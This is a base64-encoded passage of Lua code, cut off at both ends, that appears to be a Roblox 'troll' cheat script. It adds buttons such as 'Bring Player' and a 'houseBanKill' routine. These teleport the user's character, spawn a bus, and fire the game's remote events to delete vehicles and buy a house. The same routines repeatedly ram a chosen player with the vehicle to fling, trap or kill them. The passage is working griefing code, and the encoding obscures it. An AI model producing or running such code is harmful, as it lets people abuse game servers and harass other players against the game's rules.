CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9yaWdpbmFsUG9zaXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCLimqDvuI/vuLFQbGF5ZXIgcmV0dXJuZWQgdG8gaW5pdGlhbCBwb3NpdGlvbi4iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGltZSA9IHRpY2soKSAqIDM1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGxhdGVyYWxPZmZzZXQgPSBtYXRoLnNpbih0aW1lKSAqIDQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZnJvbnRCYWNrT2Zmc2V0ID0gbWF0aC5jb3ModGltZSkgKiAyMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBidXM6U2V0UHJpbWFyeVBhcnRDRnJhbWUodGFyZ2V0Um9vdC5DRnJhbWUgKiBDRnJhbWUubmV3KGxhdGVyYWxPZmZzZXQsIDAsIGZyb250QmFja09mZnNldCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHNwYXduKFRyYWNrUGxheWVyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCgogICAgVHJvbGw6QWRkQnV0dG9uKHsKICAgICAgICBOYW1lID0gIkJyaW5nIFBsYXllciIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIG5vdCBzZWxlY3RlZFBsYXllck5hbWUgb3Igbm90IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoc2VsZWN0ZWRQbGF5ZXJOYW1lKSB0aGVuCiAgICAgICAgICAgICAgICBwcmludCgi4p2M77ixUGxheWVyIG5vdCBzZWxlY3RlZCBvciBkb2VzIG5vdCBleGlzdC4iKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiBtZXRob2RLaWxsID09ICJDb3VjaCIgdGhlbgogICAgICAgICAgICAgICAgQnJpbmdQbGF5ZXJMTEwoKQogICAgICAgICAgICBlbHNlaWYgbWV0aG9kS2lsbCA9PSAiQ291Y2ggd2l0aG91dCBnb2luZyB0byB0YXJnZXQuIiB0aGVuCiAgICAgICAgICAgICAgICBCcmluZ1dpdGhDb3VjaCgpCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIC0tIEJ1cyBtZXRob2QKICAgICAgICAgICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlciBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIGlmIG5vdCBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICB3YXJuKCLinYzvuLFMb2NhbCBwbGF5ZXIncyBIdW1hbm9pZFJvb3RQYXJ0IG5vdCBmb3VuZC4iKQogICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgb3JpZ2luYWxQb3NpdGlvbiA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCgogICAgICAgICAgICAgICAgbG9jYWwgZnVuY3Rpb24gR2V0QnVzKCkKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2ZWhpY2xlcyA9IGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlcyIpCiAgICAgICAgICAgICAgICAgICAgaWYgdmVoaWNsZXMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoTG9jYWxQbGF5ZXIuTmFtZSAuLiAiQ2FyIikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmlsCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBidXMgPSBHZXRCdXMoKQoKICAgICAgICAgICAgICAgIGlmIG5vdCBidXMgdGhlbgogICAgICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxMTE4LjgxLCA3NS45OTgsIC0xMTM4LjYxKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcmVtb3RlRXZlbnQgPSBSZXBsaWNhdGVkU3RvcmFnZTpGaW5kRmlyc3RDaGlsZCgiUkUiKQogICAgICAgICAgICAgICAgICAgIGlmIHJlbW90ZUV2ZW50IGFuZCByZW1vdGVFdmVudDpGaW5kRmlyc3RDaGlsZCgiMUNhMXIiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJlbW90ZUV2ZW50WyIxQ2ExciJdOkZpcmVTZXJ2ZXIoIlBpY2tpbmdDYXIiLCAiU2Nob29sQnVzIikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICBidXMgPSBHZXRCdXMoKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgYnVzIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBzZWF0ID0gYnVzOkZpbmRGaXJzdENoaWxkKCJCb2R5IikgYW5kIGJ1cy5Cb2R5OkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlU2VhdCIpCiAgICAgICAgICAgICAgICAgICAgaWYgc2VhdCBhbmQgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKSBhbmQgbm90IGNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gc2VhdC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIDIsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBjaGFyYWN0ZXIuSHVtYW5vaWQuU2l0IG9yIG5vdCBidXMuUGFyZW50CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBUcmFja1BsYXllcigpCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBzZWxlY3RlZFBsYXllck5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UGxheWVyID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXRQbGF5ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXIgYW5kIHRhcmdldFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0SHVtYW5vaWQgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldEh1bWFub2lkIGFuZCB0YXJnZXRIdW1hbm9pZC5TaXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIuSHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVzOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKG9yaWdpbmFsUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC43KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsgWzFdID0gIkRlbGV0ZUFsbFZlaGljbGVzIiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5SRTpGaW5kRmlyc3RDaGlsZCgiMUNhMXIiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRSb290ID0gdGFyZ2V0UGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRpbWUgPSB0aWNrKCkgKiAzNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBsYXRlcmFsT2Zmc2V0ID0gbWF0aC5zaW4odGltZSkgKiA0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGZyb250QmFja09mZnNldCA9IG1hdGguY29zKHRpbWUpICogMjAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnVzOlNldFByaW1hcnlQYXJ0Q0ZyYW1lKHRhcmdldFJvb3QuQ0ZyYW1lICogQ0ZyYW1lLm5ldyhsYXRlcmFsT2Zmc2V0LCAwLCBmcm9udEJhY2tPZmZzZXQpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBzcGF3bihUcmFja1BsYXllcikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQoKCmxvY2FsIGZ1bmN0aW9uIGhvdXNlQmFuS2lsbCgpCiAgICBpZiBub3Qgc2VsZWN0ZWRQbGF5ZXJOYW1lIHRoZW4KICAgICAgICBwcmludCgi4pqg77iP77ixTm8gcGxheWVyIHNlbGVjdGVkLiIpCiAgICAgICAgcmV0dXJuCiAgICBlbmQKCiAgICBsb2NhbCBQbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIEJhY2twYWNrID0gUGxheWVyLkJhY2twYWNrCiAgICBsb2NhbCBDaGFyYWN0ZXIgPSBQbGF5ZXIuQ2hhcmFjdGVyCiAgICBsb2NhbCBIdW1hbm9pZCA9IENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgIGxvY2FsIFJvb3RQYXJ0ID0gQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGxvY2FsIEhvdXNlcyA9IGdhbWUuV29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCIwMDFfTG90cyIpCiAgICBsb2NhbCBPbGRQb3MgPSBSb290UGFydC5DRnJhbWUKICAgIGxvY2FsIEFuZ2xlcyA9IDAKICAgIGxvY2FsIFZlaGljbGVzID0gV29ya3NwYWNlLlZlaGljbGVzCiAgICBsb2NhbCBQb3MKCiAgICBmdW5jdGlvbiBDaGVjaygpCiAgICAgICAgaWYgUGxheWVyIGFuZCBDaGFyYWN0ZXIgYW5kIEh1bWFub2lkIGFuZCBSb290UGFydCBhbmQgVmVoaWNsZXMgdGhlbgogICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgIGVsc2UKICAgICAgICAgICAgcmV0dXJuIGZhbHNlCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBzZWxlY3RlZFBsYXllciA9IGdhbWUuUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpCiAgICBpZiBzZWxlY3RlZFBsYXllciBhbmQgc2VsZWN0ZWRQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICBpZiBDaGVjaygpIHRoZW4KICAgICAgICAgICAgbG9jYWwgSG91c2UgPSBIb3VzZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gIkhvdXNlIikKICAgICAgICAgICAgaWYgbm90IEhvdXNlIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGVtcHR5SG91c2UKICAgICAgICAgICAgICAgIGxvY2FsIGF2YWlsYWJsZUhvdXNlcyA9IHt9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9yIF8sIExvdCBpbiBwYWlycyhIb3VzZXM6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBMb3QuTmFtZSA9PSAiRm9yIFNhbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG51bSBpbiBwYWlycyhMb3Q6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG51bTpJc0EoIk51bWJlclZhbHVlIikgYW5kIG51bS5OYW1lID09ICJOdW1iZXIiIGFuZCBudW0uVmFsdWUgPCAyNSBhbmQgbnVtLlZhbHVlID4gMTAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChhdmFpbGFibGVIb3VzZXMsIHtMb3QgPSBMb3QsIE51bWJlciA9IG51bS5WYWx1ZX0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAjYXZhaWxhYmxlSG91c2VzID4gMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcmFuZG9tSG91c2UgPSBhdmFpbGFibGVIb3VzZXNbbWF0aC5yYW5kb20oMSwgI2F2YWlsYWJsZUhvdXNlcyldCiAgICAgICAgICAgICAgICAgICAgZW1wdHlIb3VzZSA9IHJhbmRvbUhvdXNlLkxvdAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGhvdXNlTnVtYmVyID0gcmFuZG9tSG91c2UuTnVtYmVyCgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIEJ1eURldGVjdG9yID0gZW1wdHlIb3VzZTpGaW5kRmlyc3RDaGlsZCgiQnV5SG91c2UiKQogICAgICAgICAgICAgICAgICAgIFBvcyA9IEJ1eURldGVjdG9yLlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgaWYgQnV5RGV0ZWN0b3IgYW5kIEJ1eURldGVjdG9yOklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IEJ1eURldGVjdG9yLkNGcmFtZSArIFZlY3RvcjMubmV3KDAsIC02LCAwKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBDbGlja0RldGVjdG9yID0gQnV5RGV0ZWN0b3I6RmluZEZpcnN0Q2hpbGQoIkNsaWNrRGV0ZWN0b3IiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBDbGlja0RldGVjdG9yIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmVjbGlja2RldGVjdG9yKENsaWNrRGV0ZWN0b3IpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGhvdXNlTnVtYmVyLCAtLSBSYW5kb20gaG91c2UgbnVtYmVyCiAgICAgICAgICAgICAgICAgICAgICAgICIwNTZfSG91c2UiIC0tIEhvdXNlIHR5cGUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUmVtb3RlcyIpOldhaXRGb3JDaGlsZCgiTG90OkJ1aWxkUHJvcGVydHkiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBwcmludCgi4p2M77ixTm8gYXZhaWxhYmxlIGhvdXNlcyB0byBidXkuIikKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGxvY2FsIFByZUhvdXNlID0gSG91c2VzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lIC4uICJIb3VzZSIpCiAgICAgICAgICAgIGlmIFByZUhvdXNlIHRoZW4KICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICBsb2NhbCBOdW1iZXIKICAgICAgICAgICAgICAgIGZvciBpLCB4IGluIHBhaXJzKFByZUhvdXNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgeC5OYW1lID09ICJOdW1iZXIiIGFuZCB4OklzQSgiTnVtYmVyVmFsdWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIE51bWJlciA9IHgKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUdldHRpbjFnSG91czFlIik6RmlyZVNlcnZlcigiUGlja2luZ0N1c3RvbUhvdXNlIiwgIjA0OV9Ib3VzZSIsIE51bWJlci5WYWx1ZSkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBsb2NhbCBQQ2FyID0gVmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gIkNhciIpCiAgICAgICAgICAgIGlmIG5vdCBQQ2FyIHRoZW4KICAgICAgICAgICAgICAgIGlmIENoZWNrKCkgdGhlbgogICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMTExOC44MSwgNzUuOTk4LCAtMTEzOC42MSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUNhMXIiKTpGaXJlU2VydmVyKCJQaWNraW5nQ2FyIiwgIlNjaG9vbEJ1cyIpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBQQ2FyID0gVmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gIkNhciIpCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICBsb2NhbCBTZWF0ID0gUENhcjpGaW5kRmlyc3RDaGlsZCgiQm9keSIpIGFuZCBQQ2FyLkJvZHk6RmluZEZpcnN0Q2hpbGQoIlZlaGljbGVTZWF0IikKICAgICAgICAgICAgICAgICAgICBpZiBTZWF0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gU2VhdC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIG1hdGgucmFuZG9tKC0xLCAxKSwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgSHVtYW5vaWQuU2l0CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBsb2NhbCBQQ2FyID0gVmVoaWNsZXM6RmluZEZpcnN0Q2hpbGQoUGxheWVyLk5hbWUgLi4gIkNhciIpCiAgICAgICAgICAgIGlmIFBDYXIgdGhlbgogICAgICAgICAgICAgICAgaWYgbm90IEh1bWFub2lkLlNpdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgU2VhdCA9IFBDYXI6RmluZEZpcnN0Q2hpbGQoIkJvZHkiKSBhbmQgUENhci5Cb2R5OkZpbmRGaXJzdENoaWxkKCJWZWhpY2xlU2VhdCIpCiAgICAgICAgICAgICAgICAgICAgaWYgU2VhdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IFNlYXQuQ0ZyYW1lICogQ0ZyYW1lLm5ldygwLCBtYXRoLnJhbmRvbSgtMSwgMSksIDApCiAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsIEh1bWFub2lkLlNpdAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgbG9jYWwgVGFyZ2V0ID0gc2VsZWN0ZWRQbGF5ZXIKICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldEMgPSBUYXJnZXQuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCBUYXJnZXRIID0gVGFyZ2V0QzpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgIGxvY2FsIFRhcmdldFJQID0gVGFyZ2V0QzpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBpZiBUYXJnZXRDIGFuZCBUYXJnZXRIIGFuZCBUYXJnZXRSUCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IFRhcmdldEguU2l0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgbm90IFRhcmdldEguU2l0IGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgRmxpbmcgPSBmdW5jdGlvbih0YXJnZXQsIHBvcywgYW5nbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENhcjpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KHRhcmdldC5Qb3NpdGlvbikgKiBwb3MgKiBhbmdsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgQW5nbGVzID0gQW5nbGVzICsgMTAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGbGluZyhUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAxLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICogVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIC0xLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICogVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDIuMjUsIDEuNSwgLTIuMjUpICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICogVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KC0yLjI1LCAtMS41LCAyLjI1KSArIFRhcmdldEguTW92ZURpcmVjdGlvbiAqIFRhcmdldFJQLlZlbG9jaXR5Lk1hZ25pdHVkZSAvIDEuMTAsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGVzKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGbGluZyhUYXJnZXRSUCwgQ0ZyYW1lLm5ldygwLCAxLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICogVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZsaW5nKFRhcmdldFJQLCBDRnJhbWUubmV3KDAsIC0xLjUsIDApICsgVGFyZ2V0SC5Nb3ZlRGlyZWN0aW9uICogVGFyZ2V0UlAuVmVsb2NpdHkuTWFnbml0dWRlIC8gMS4xMCwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZXMpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEhvdXNlID0gSG91c2VzOkZpbmRGaXJzdENoaWxkKFBsYXllci5OYW1lIC4uICJIb3VzZSIpCiAgICAgICAgICAgICAgICAgICAgICAgIFBDYXI6U2V0UHJpbWFyeVBhcnRDRnJhbWUoQ0ZyYW1lLm5ldyhIb3VzZS5Ib3VzZVNwYXduUG9zaXRpb24uUG9zaXRpb24pKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4yKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCByZWdpb24gPSBSZWdpb24zLm5ldyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24gLSBWZWN0b3IzLm5ldygzMCwgMzAsIDMwKSwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMzAsIDMwLCAzMCkpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHBhcnRzSW5SZWdpb24gPSB3b3Jrc3BhY2U6RmluZFBhcnRzSW5SZWdpb24zKHJlZ2lvbiwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LCBtYXRoLmh1Z2UpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKHBhcnRzSW5SZWdpb24pIGRvCiAgICAgICAgICAgICAgICAg